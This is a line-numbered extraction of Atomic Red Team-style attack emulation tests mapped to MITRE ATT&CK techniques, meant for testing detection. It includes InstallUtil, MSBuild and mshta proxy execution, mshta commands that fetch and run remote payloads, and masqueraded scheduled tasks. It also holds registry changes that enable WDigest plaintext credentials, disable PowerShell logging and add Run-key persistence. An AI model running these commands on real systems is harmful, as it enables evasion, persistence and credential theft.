2996: [- name: InstallUtil Uninstall method call - /U variant] [attack_technique: T1218.004] [      }]
3004: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [    command: |]
3005: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly]
3006: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      . #{test_harness}]
3007: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] []
3008: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      $InstallerAssemblyDir = "#{assembly_dir}"]
3009: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      $InstallerAssemblyFileName = "#{assembly_filename}"]
3010: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName]
3011: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] []
3012: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      $CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `"$InstallerAssemblyFullPath`""]
3013: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      $ExpectedOutput = 'Constructor_Uninstall_']
3014: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] []
3015: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      $TestArgs = @{]
3016: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [          OutputAssemblyDirectory = $InstallerAssemblyDir]
3017: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [          OutputAssemblyFileName = $InstallerAssemblyFileName]
3018: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [          InvocationMethod = '#{invocation_method}']
3019: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [          CommandLine = $CommandLine]
3020: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      }]
3021: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] []
3022: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs]
3023: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] []
3024: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      if ($ActualOutput -ne $ExpectedOutput) {]
3025: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [          throw @"]
3026: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.]
3027: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      Expected: $ExpectedOutput]
3028: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      Actual: $ActualOutput]
3029: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      "@]
3030: [- name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant] [attack_technique: T1218.004] [      }]
3038: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [    command: |]
3039: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly]
3040: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      . #{test_harness}]
3041: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] []
3042: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      $InstallerAssemblyDir = "#{assembly_dir}"]
3043: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      $InstallerAssemblyFileName = "#{assembly_filename}"]
3044: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName]
3045: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] []
3046: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      $CommandLine = "/? `"$InstallerAssemblyFullPath`""]
3047: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      $ExpectedOutput = 'Constructor_HelpText_']
3048: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] []
3049: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      $TestArgs = @{]
3050: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [          OutputAssemblyDirectory = $InstallerAssemblyDir]
3051: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [          OutputAssemblyFileName = $InstallerAssemblyFileName]
3052: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [          InvocationMethod = '#{invocation_method}']
3053: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [          CommandLine = $CommandLine]
3054: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      }]
3055: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] []
3056: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs]
3057: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] []
3058: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      if ($ActualOutput -ne $ExpectedOutput) {]
3059: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [          throw @"]
3060: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.]
3061: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      Expected: $ExpectedOutput]
3062: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      Actual: $ActualOutput]
3063: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      "@]
3064: [- name: InstallUtil HelpText method call] [attack_technique: T1218.004] [      }]
3072: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [    command: |]
3073: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly]
3074: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      . #{test_harness}]
3075: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] []
3076: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      $InstallerAssemblyDir = "$Env:windir\System32\Tasks"]
3077: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      $InstallerAssemblyFileName = 'readme.txt']
3078: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName]
3079: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] []
3080: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      $CommandLine = "readme.txt"]
3081: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      $ExpectedOutput = 'Constructor_']
3082: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] []
3083: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      # Explicitly set the directory so that a relative path to readme.txt can be supplied.]
3084: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      Set-Location "$Env:windir\System32\Tasks"]
3085: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] []
3086: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      Copy-Item -Path "$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" -Destination "$Env:windir\System32\Tasks\notepad.exe"]
3087: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] []
3088: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      $TestArgs = @{]
3089: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [          OutputAssemblyDirectory = $InstallerAssemblyDir]
3090: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [          OutputAssemblyFileName = $InstallerAssemblyFileName]
3091: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [          InvocationMethod = 'Executable']
3092: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [          CommandLine = $CommandLine]
3093: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [          InstallUtilPath = "$Env:windir\System32\Tasks\notepad.exe"]
3094: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      }]
3095: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] []
3096: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly]
3097: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] []
3098: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      if ($ActualOutput -ne $ExpectedOutput) {]
3099: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [          throw @"]
3100: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.]
3101: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      Expected: $ExpectedOutput]
3102: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      Actual: $ActualOutput]
3103: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      "@]
3104: [- name: InstallUtil evasive invocation] [attack_technique: T1218.004] [      }]
3133: [- name: MSBuild Bypass Using Inline Tasks (C#)] [attack_technique: T1127.001] [    command: |]
3134: [- name: MSBuild Bypass Using Inline Tasks (C#)] [attack_technique: T1127.001] [      #{msbuildpath}\#{msbuildname} #{filename}]
3137: [- name: MSBuild Bypass Using Inline Tasks (VB)] [attack_technique: T1127.001] [    command: |]
3138: [- name: MSBuild Bypass Using Inline Tasks (VB)] [attack_technique: T1127.001] [      #{msbuildpath}\#{msbuildname} #{filename}]
3141: [- name: Mount ISO image] [attack_technique: T1553.005] [    command: |]
3142: [- name: Mount ISO image] [attack_technique: T1553.005] [      Mount-DiskImage -ImagePath "#{path_of_iso}"]
3147: [- name: Mount an ISO image and run executable from the ISO] [attack_technique: T1553.005] [    command: |]
3148: [- name: Mount an ISO image and run executable from the ISO] [attack_technique: T1553.005] [      $keep = Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly]
3149: [- name: Mount an ISO image and run executable from the ISO] [attack_technique: T1553.005] [      $driveLetter = ($keep | Get-Volume).DriveLetter]
3150: [- name: Mount an ISO image and run executable from the ISO] [attack_technique: T1553.005] [      invoke-item "$($driveLetter):\hello.exe"]
3156: [- name: Remove the Zone.Identifier alternate data stream] [attack_technique: T1553.005] [    command: |]
3157: [- name: Remove the Zone.Identifier alternate data stream] [attack_technique: T1553.005] [      Unblock-File -Path #{file_path}]
3162: [- name: Creating W32Time similar named service using schtasks] [attack_technique: T1036.004] [    command: |]
3163: [- name: Creating W32Time similar named service using schtasks] [attack_technique: T1036.004] [      schtasks /create /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1" /tn win32times /f]
3164: [- name: Creating W32Time similar named service using schtasks] [attack_technique: T1036.004] [      schtasks /query /tn win32times]
3169: [- name: Creating W32Time similar named service using sc] [attack_technique: T1036.004] [    command: |]
3170: [- name: Creating W32Time similar named service using sc] [attack_technique: T1036.004] [      sc create win32times binPath= "cmd /c start c:\T1036.004_NonExistingScript.ps1"]
3171: [- name: Creating W32Time similar named service using sc] [attack_technique: T1036.004] [      sc qc win32times]
3193: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [    command: |]
3194: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [      mkdir $HOME/...]
3195: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [      cp $(which sh) $HOME/...]
3196: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [      $HOME/.../sh -c "echo #{test_message}"]
3209: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [    command: |]
3210: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [      Add-Type -TypeDefinition @']
3211: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [      public class Test {]
3212: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [          public static void Main(string[] args) {]
3213: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [              System.Console.WriteLine("tweet, tweet");]
3214: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [          }]
3215: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [      }]
3216: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [      '@ -OutputAssembly "#{executable_filepath}"]
3217: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [      ]
3218: [- name: Masquerade as a built-in system executable] [attack_technique: T1036.005] [      Start-Process -FilePath "#{executable_filepath}"]
3223: [- name: Modify Registry of Current User Profile - cmd] [attack_technique: T1112] [    command: |]
3224: [- name: Modify Registry of Current User Profile - cmd] [attack_technique: T1112] [      reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f]
3229: [- name: Modify Registry of Local Machine - cmd] [attack_technique: T1112] [    command: |]
3230: [- name: Modify Registry of Local Machine - cmd] [attack_technique: T1112] [      reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f]
3235: [- name: Modify registry to store logon credentials] [attack_technique: T1112] [    command: |]
3236: [- name: Modify registry to store logon credentials] [attack_technique: T1112] [      reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f]
3241: [- name: Add domain to Trusted sites Zone] [attack_technique: T1112] [    command: |]
3242: [- name: Add domain to Trusted sites Zone] [attack_technique: T1112] [      $key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\"]
3243: [- name: Add domain to Trusted sites Zone] [attack_technique: T1112] [      $name ="bad-subdomain"]
3244: [- name: Add domain to Trusted sites Zone] [attack_technique: T1112] [      new-item $key -Name $name -Force]
3245: [- name: Add domain to Trusted sites Zone] [attack_technique: T1112] [      new-itemproperty $key$name -Name https -Value 2 -Type DWORD;]
3246: [- name: Add domain to Trusted sites Zone] [attack_technique: T1112] [      new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;]
3247: [- name: Add domain to Trusted sites Zone] [attack_technique: T1112] [      new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;]
3253: [- name: Javascript in registry] [attack_technique: T1112] [    command: |]
3254: [- name: Javascript in registry] [attack_technique: T1112] [      New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -Value "<script>"]
3259: [- name: Change Powershell Execution Policy to Bypass] [attack_technique: T1112] [    command: |]
3260: [- name: Change Powershell Execution Policy to Bypass] [attack_technique: T1112] [      Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine]
3265: [- name: BlackByte Ransomware Registry Changes - CMD] [attack_technique: T1112] [    command: |]
3266: [- name: BlackByte Ransomware Registry Changes - CMD] [attack_technique: T1112] [      cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f]
3267: [- name: BlackByte Ransomware Registry Changes - CMD] [attack_technique: T1112] [      cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f]
3268: [- name: BlackByte Ransomware Registry Changes - CMD] [attack_technique: T1112] [      cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f]
3275: [- name: BlackByte Ransomware Registry Changes - Powershell] [attack_technique: T1112] [    command: |]
3276: [- name: BlackByte Ransomware Registry Changes - Powershell] [attack_technique: T1112] [      New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force]
3277: [- name: BlackByte Ransomware Registry Changes - Powershell] [attack_technique: T1112] [      New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force]
3278: [- name: BlackByte Ransomware Registry Changes - Powershell] [attack_technique: T1112] [      New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force]
3285: [- name: Disable Windows Registry Tool] [attack_technique: T1112] [    command: |]
3286: [- name: Disable Windows Registry Tool] [attack_technique: T1112] [      reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f]
3291: [- name: Disable Windows CMD application] [attack_technique: T1112] [    command: |]
3292: [- name: Disable Windows CMD application] [attack_technique: T1112] [      New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name DisableCMD -Value 1]
3297: [- name: Disable Windows Task Manager application] [attack_technique: T1112] [    command: |]
3298: [- name: Disable Windows Task Manager application] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t REG_DWORD /d 1 /f]
3303: [- name: Disable Windows Notification Center] [attack_technique: T1112] [    command: |]
3304: [- name: Disable Windows Notification Center] [attack_technique: T1112] [      reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f]
3309: [- name: Disable Windows Shutdown Button] [attack_technique: T1112] [    command: |]
3310: [- name: Disable Windows Shutdown Button] [attack_technique: T1112] [      reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f]
3315: [- name: Disable Windows LogOff Button ] [attack_technique: T1112] [    command: |]
3316: [- name: Disable Windows LogOff Button ] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f]
3317: [- name: Disable Windows LogOff Button ] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 1 /f]
3323: [- name: Disable Windows Change Password Feature] [attack_technique: T1112] [    command: |]
3324: [- name: Disable Windows Change Password Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f]
3329: [- name: Disable Windows Lock Workstation Feature] [attack_technique: T1112] [    command: |]
3330: [- name: Disable Windows Lock Workstation Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f]
3335: [- name: Activate Windows NoDesktop Group Policy Feature] [attack_technique: T1112] [    command: |]
3336: [- name: Activate Windows NoDesktop Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f]
3341: [- name: Activate Windows NoRun Group Policy Feature] [attack_technique: T1112] [    command: |]
3342: [- name: Activate Windows NoRun Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f]
3347: [- name: Activate Windows NoFind Group Policy Feature] [attack_technique: T1112] [    command: |]
3348: [- name: Activate Windows NoFind Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f]
3353: [- name: Activate Windows NoControlPanel Group Policy Feature] [attack_technique: T1112] [    command: |]
3354: [- name: Activate Windows NoControlPanel Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f]
3359: [- name: Activate Windows NoFileMenu Group Policy Feature] [attack_technique: T1112] [    command: |]
3360: [- name: Activate Windows NoFileMenu Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileMenu /t REG_DWORD /d 1 /f]
3365: [- name: Activate Windows NoClose Group Policy Feature] [attack_technique: T1112] [    command: |]
3366: [- name: Activate Windows NoClose Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f]
3371: [- name: Activate Windows NoSetTaskbar Group Policy Feature] [attack_technique: T1112] [    command: |]
3372: [- name: Activate Windows NoSetTaskbar Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /t REG_DWORD /d 1 /f]
3377: [- name: Activate Windows NoTrayContextMenu Group Policy Feature] [attack_technique: T1112] [    command: |]
3378: [- name: Activate Windows NoTrayContextMenu Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /t REG_DWORD /d 1 /f]
3383: [- name: Activate Windows NoPropertiesMyDocuments Group Policy Feature] [attack_technique: T1112] [    command: |]
3384: [- name: Activate Windows NoPropertiesMyDocuments Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 ]
3389: [- name: Hide Windows Clock Group Policy Feature] [attack_technique: T1112] [    command: |]
3390: [- name: Hide Windows Clock Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f]
3395: [- name: Windows HideSCAHealth Group Policy Feature] [attack_technique: T1112] [    command: |]
3396: [- name: Windows HideSCAHealth Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAHealth /t REG_DWORD /d 1 /f]
3401: [- name: Windows HideSCANetwork Group Policy Feature] [attack_technique: T1112] [    command: |]
3402: [- name: Windows HideSCANetwork Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f]
3407: [- name: Windows HideSCAPower Group Policy Feature] [attack_technique: T1112] [    command: |]
3408: [- name: Windows HideSCAPower Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAPower /t REG_DWORD /d 1 /f]
3413: [- name: Windows HideSCAVolume Group Policy Feature] [attack_technique: T1112] [    command: |]
3414: [- name: Windows HideSCAVolume Group Policy Feature] [attack_technique: T1112] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAVolume /t REG_DWORD /d 1 /f]
3419: [- name: Windows Modify Show Compress Color And Info Tip Registry] [attack_technique: T1112] [    command: |]
3420: [- name: Windows Modify Show Compress Color And Info Tip Registry] [attack_technique: T1112] [      reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f]
3421: [- name: Windows Modify Show Compress Color And Info Tip Registry] [attack_technique: T1112] [      reg  add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f]
3427: [- name: Windows Powershell Logging Disabled] [attack_technique: T1112] [    command: |]
3428: [- name: Windows Powershell Logging Disabled] [attack_technique: T1112] [      reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f]
3429: [- name: Windows Powershell Logging Disabled] [attack_technique: T1112] [      reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f]
3430: [- name: Windows Powershell Logging Disabled] [attack_technique: T1112] [      reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f]
3431: [- name: Windows Powershell Logging Disabled] [attack_technique: T1112] [      reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f]
3432: [- name: Windows Powershell Logging Disabled] [attack_technique: T1112] [      REM do a little cleanup immediately to avoid execution issues with later tests]
3433: [- name: Windows Powershell Logging Disabled] [attack_technique: T1112] [      reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1]
3440: [- name: Windows Add Registry Value to Load Service in Safe Mode without Network] [attack_technique: T1112] [    command: |]
3441: [- name: Windows Add Registry Value to Load Service in Safe Mode without Network] [attack_technique: T1112] [      REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode" /VE /T REG_SZ /F /D "Service"]
3446: [- name: Windows Add Registry Value to Load Service in Safe Mode with Network] [attack_technique: T1112] [    command: |]
3447: [- name: Windows Add Registry Value to Load Service in Safe Mode with Network] [attack_technique: T1112] [      REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode" /VE /T REG_SZ /F /D "Service"]
3452: [- name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject] [attack_technique: T1218.005] [    command: |]
3453: [- name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject] [attack_technique: T1218.005] [      mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();]
3456: [- name: Mshta executes VBScript to execute malicious command] [attack_technique: T1218.005] [    command: |]
3457: [- name: Mshta executes VBScript to execute malicious command] [attack_technique: T1218.005] [      mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"":close")]
3460: [- name: Mshta Executes Remote HTML Application (HTA)] [attack_technique: T1218.005] [    command: |]
3461: [- name: Mshta Executes Remote HTML Application (HTA)] [attack_technique: T1218.005] [      $var =Invoke-WebRequest "#{hta_url}"]
3462: [- name: Mshta Executes Remote HTML Application (HTA)] [attack_technique: T1218.005] [      $var.content|out-file "#{temp_file}"]
3463: [- name: Mshta Executes Remote HTML Application (HTA)] [attack_technique: T1218.005] [      mshta "#{temp_file}"]
3468: [- name: Mshta used to Execute PowerShell] [attack_technique: T1218.005] [    command: |]
3469: [- name: Mshta used to Execute PowerShell] [attack_technique: T1218.005] [      mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}"""))</script>'"]
3472: [- name: Msiexec.exe - Execute Local MSI file with embedded JScript] [attack_technique: T1218.007] [    command: |]
3473: [- name: Msiexec.exe - Execute Local MSI file with embedded JScript] [attack_technique: T1218.007] [      msiexec.exe /q /#{action} "#{msi_payload}"]
3476: [- name: Msiexec.exe - Execute Local MSI file with embedded VBScript] [attack_technique: T1218.007] [    command: |]
3477: [- name: Msiexec.exe - Execute Local MSI file with embedded VBScript] [attack_technique: T1218.007] [      msiexec.exe /q /#{action} "#{msi_payload}"]
3480: [- name: Msiexec.exe - Execute Local MSI file with an embedded DLL] [attack_technique: T1218.007] [    command: |]
3481: [- name: Msiexec.exe - Execute Local MSI file with an embedded DLL] [attack_technique: T1218.007] [      msiexec.exe /q /#{action} "#{msi_payload}"]
3484: [- name: Msiexec.exe - Execute Local MSI file with an embedded EXE] [attack_technique: T1218.007] [    command: |]
3485: [- name: Msiexec.exe - Execute Local MSI file with an embedded EXE] [attack_technique: T1218.007] [      msiexec.exe /q /#{action} "#{msi_payload}"]
3488: [- name: WMI Win32_Product Class - Execute Local MSI file with embedded JScript] [attack_technique: T1218.007] [    command: |]
